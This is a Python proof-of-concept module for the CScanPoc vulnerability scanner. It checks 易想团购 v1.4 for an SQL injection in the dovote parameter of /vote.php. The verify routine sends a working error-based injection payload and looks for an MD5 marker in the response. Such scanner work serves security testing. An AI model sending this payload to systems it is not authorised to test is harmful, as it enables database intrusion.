# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    vuln_id = 'YXTG_0007' # 平台漏洞编号，留空
    name = '易想团购 v1.4 /vote.php dovote参数 SQL注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2012-01-25'  # 漏洞公布时间
    desc = '''
        易想团购 v1.4 /vote.php dovote参数 SQL注入漏洞
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=03969' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = '易想团购'  # 漏洞应用名称
    product_version = '1.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6bc97cd9-3dea-46c8-9725-5352115f5127'
    author = '国光'  # POC编写者
    create_date = '2018-05-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/vote.php?act=dovote&name[1 and (select 1 from(select count(*),concat(0x7c,md5(666),"
                   "0x7c,floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)%23][111]=aa") 
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            
            if 'fae0b27c451c728867a567e8c1bb4e53' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()